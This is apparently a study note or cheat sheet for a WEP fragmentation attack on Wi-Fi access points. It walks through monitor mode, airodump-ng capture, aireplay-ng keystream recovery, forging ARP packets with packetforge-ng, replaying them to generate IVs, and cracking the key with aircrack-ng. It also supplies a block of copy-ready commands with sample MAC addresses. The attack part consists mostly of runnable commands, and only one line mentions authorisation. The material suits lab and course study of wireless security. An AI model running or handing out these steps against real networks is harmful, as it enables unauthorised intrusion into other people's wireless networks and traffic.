# Fragmentation Attack — Purpose & Quick Overview

Short purpose: capture or generate enough PRGA (keystream) bytes from a WEP-protected AP using 802.11 fragmentation, so you can forge packets (most commonly an ARP request) and then replay them to rapidly produce IVs for offline WEP cracking.

---

## Key terms

- **WEP** — Wired Equivalent Privacy (insecure legacy Wi‑Fi encryption).
- **IV (Initialization Vector)** — per-packet public value used with the WEP key; collecting many IVs enables attacks.
- **PRGA (Pseudo Random Generation Algorithm)** — RC4 keystream bytes generated per IV; XORed with plaintext to produce ciphertext. Knowing PRGA lets you encrypt/decrypt.
- **Fragmentation attack** — exploit where attacker crafts fragmented frames and uses known plaintext/LLC header to recover PRGA bytes across fragments.
- **ARP request/relay** — a small predictable broadcast packet often used to generate many IVs when replayed.
- **Monitor mode** — NIC mode that captures and injects raw 802.11 frames (required).

---

## Step-by-step workflow (concise)

1. **Enable monitor mode**    
    - `sudo airmon-ng start wlan0` → usually creates `wlan0mon`.
    - Verify with `iwconfig` (should show `Mode:Monitor`).

2. **Scan and capture**
    - Start airodump to record traffic and identify target AP/clients and channel:
	    ```bash
        sudo airodump-ng wlan0mon -c <channel> -w WEP
        ```
    - Note: output files `WEP-01.cap`, `WEP-01.csv` etc.

3. **Launch fragmentation attack to obtain PRGA (.xor)**
    - Run aireplay-ng fragmentation mode:
        ```bash
        sudo aireplay-ng -5 -b <AP_BSSID> -h <source_MAC> wlan0mon
        ```
    - Follow prompts to choose a captured data frame if requested. aireplay-ng will attempt to build fragments and show messages like "Trying to get 1500 bytes of a keystream" and will save a `.xor` file (e.g. `fragment-<timestamp>.xor`).

4. **Inspect capture to find IP/MAC info (optional but helpful)**
    - Use tcpdump or Wireshark to read the chosen packet and extract source/dest IP and MACs:
        ```bash
        tcpdump -s 0 -n -e -r replay_src-<timestamp>.cap
        ```

5. **Forge ARP request using PRGA**
    - Use packetforge-ng with the `.xor` file to create an encrypted ARP request (or other packet types):
        ```bash
        packetforge-ng -0 -a <AP_BSSID> -h <STA_MAC> -k <AP_IP> -l <STA_IP> -y fragment-xxxx.xor -w forgedarp.cap
        ```
    - Notes: `-0` = ARP request. `-y` points to PRGA/.xor file.

6. **Inject forged packet (Interactive Packet Replay)**
    - Replay forged ARP to the network to cause the AP to broadcast replies and generate many IVs:
        ```bash
        sudo aireplay-ng -2 -r forgedarp.cap -h <STA_MAC> wlan0mon
        ```
    - Monitor `airodump-ng` to watch the `#Data, #/s` and the Frames counter for the station rise — this indicates IVs are being generated.
        
7. **Optionally run ARP replay (fast IV generation)**    
    - In a separate terminal, run an ARP replay to amplify IV collection:
        ```bash
        sudo aireplay-ng -3 -b <AP_BSSID> -h <STA_MAC> wlan0mon
        ```
    - `-3` stores captured ARP requests (replay attack) and can replay them to force the AP to create many IVs quickly.
        
8. **Crack WEP offline**
    - Once enough IVs are collected in the capture file (aircrack-ng will indicate progress), run:
        ```bash
        aircrack-ng -b <AP_BSSID> WEP-01.cap
        ```
    - When sufficient IVs exist, aircrack-ng (PTW/Korek methods) will display `KEY FOUND! [ xx:xx:xx:xx:xx:xx ]`.        

---

## Command & reference snippets (practical quick copy)

- Enable monitor mode: `sudo airmon-ng start wlan0`    
- Confirm: `iwconfig`
- Airodump capture: `sudo airodump-ng wlan0mon -c 1 -w WEP`
- Fragmentation attack: `sudo aireplay-ng -5 -b A2:BD:32:EB:21:15 -h 42:E9:11:39:88:AE wlan0mon`
- View chosen packet: `tcpdump -s 0 -n -e -r replay_src-0805-191842.cap`
- Build ARP packet: `packetforge-ng -0 -a <AP> -h <STA> -k <AP_IP> -l <STA_IP> -y fragment.xor -w forgedarp.cap`
- Interactive packet replay: `sudo aireplay-ng -2 -r forgedarp.cap -h <STA_MAC> wlan0mon`
- ARP replay (fast IVs): `sudo aireplay-ng -3 -b <AP_BSSID> -h <STA_MAC> wlan0mon`
- Crack: `aircrack-ng -b <AP_BSSID> WEP-01.cap`

---

## Practical tips & gotchas

- The LLC/SNAP header gives you the first 8 bytes of predictable plaintext (useful for deriving PRGA). ARP packets are small and predictable which is why forged ARPs are used.    
- If the captured packet lacks IP addresses, use `-k 255.255.255.255 -l 255.255.255.255` with packetforge-ng to create broadcast ARP-like packets.
- Ensure your wireless card supports injection and monitor mode (test with `aireplay-ng --test wlan0mon`).
- Some modern APs or WPA3 networks may not be vulnerable — this method targets WEP only.
- Be careful with legal/ethical boundaries: only test on networks you own or have explicit authorization to test.

---

## Summary

Fragmentation attacks exploit WEP’s per-fragment RC4 keystream application and predictable LLC/SNAP headers to recover PRGA bytes by causing the AP to reassemble attacker-supplied fragments; the recovered PRGA lets you forge an ARP request that, when replayed, generates a large number of IVs quickly — making WEP cracking feasible offline with aircrack-ng.